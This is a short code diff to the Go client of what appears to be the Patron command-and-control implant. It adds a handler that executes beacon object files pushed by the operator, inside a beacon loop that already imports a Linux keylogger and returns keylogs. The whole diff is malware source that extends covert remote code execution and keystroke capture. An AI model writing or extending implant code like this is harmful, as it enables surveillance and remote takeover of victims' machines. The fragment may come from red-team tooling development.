@@ -9,6 +9,7 @@ import (
 
 	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/client/client_utils"
+	"github.com/PatronC2/Patron/client/linux_utils"
 	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/linux-keylogger-1/keylogger"
@@ -153,6 +154,11 @@ func main() {
 
 		if err := handleKeysRequest(beacon, agentID); err != nil {
 			client_utils.HandleError(beacon, "keylogs", err)
+			continue
+		}
+
+		if err := linux_utils.HandleBOFExecuteRequest(beacon, agentID); err != nil {
+			client_utils.HandleError(beacon, "bof", err)
 			continue
 		}
 
